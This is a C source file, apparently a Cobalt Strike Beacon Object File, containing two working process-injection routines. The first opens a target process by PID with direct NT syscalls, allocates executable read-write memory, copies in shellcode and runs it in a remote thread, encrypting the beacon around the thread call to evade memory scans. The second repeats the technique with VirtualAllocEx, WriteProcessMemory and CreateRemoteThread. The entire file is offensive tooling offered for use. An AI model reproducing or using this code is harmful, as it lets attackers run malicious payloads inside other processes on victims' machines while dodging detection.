

#include "Syscalls.h"

VOID InjectShellcode(DWORD pid, char *sc_ptr, SIZE_T sc_len)
{
    SIZE_T wr;
    HANDLE processHandle = NULL, threadHandle = NULL;
    LPVOID ds = NULL;
    NTSTATUS nts;
    CLIENT_ID cid = {0};
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    LARGE_INTEGER li;
    // Opening process
    cid.UniqueProcess = pid;

    nts = NtOpenProcess(&processHandle,
                        PROCESS_ALL_ACCESS, &oa, &cid);

    if (nts >= 0)
    {
        sc_len++;
        // Allocating read-write (RWX) memory for shellcode (opsec 101)
        nts = NtAllocateVirtualMemory(
            processHandle, &ds, 0, &sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (nts >= 0)
        {
            // Copying shellcode to remote process
            nts = NtWriteVirtualMemory(processHandle, ds, sc_ptr, sc_len - 1, &wr);
            if (nts >= 0)
            {
                ENCRYPT_BEACON;
                // Executing thread in remote process
                nts = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, (LPTHREAD_START_ROUTINE)ds, NULL, FALSE, 0, 0, 0, NULL);
                DECRYPT_BEACON;

                if (threadHandle != NULL)
                {
                    // Waiting for thread to exit
                    li.QuadPart = INFINITE;
                    nts = NtWaitForSingleObject(threadHandle, FALSE, &li);

                    // Close thread handle
                    NtClose(threadHandle);
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to create remote thread");
                }
            }
            // Free remote memory
            NtFreeVirtualMemory(processHandle, ds, 0, MEM_RELEASE | MEM_DECOMMIT);
        }
    }
}

DWORD InjectShellcode2(DWORD pid, char *sc_ptr, SIZE_T sc_len)
{

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!hProcess)
    {
        return KERNEL32$GetLastError();
    }

    LPVOID remote = KERNEL32$VirtualAllocEx(hProcess, NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remote)
    {
        return 2;
    }

    SIZE_T len = 0;

    BOOL ret = KERNEL32$WriteProcessMemory(hProcess, remote, sc_ptr, sc_len, &len);
    if (!ret)
        return 3;

    DWORD threadID = 0;
    HANDLE hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, &threadID);
    if (NULL == hThread)
    {
        // BeaconPrintf(CALLBACK_ERROR, "Failed to create remote thread: %d\n", KERNEL32$GetLastError());
        return 4;
    }

    return 101;
}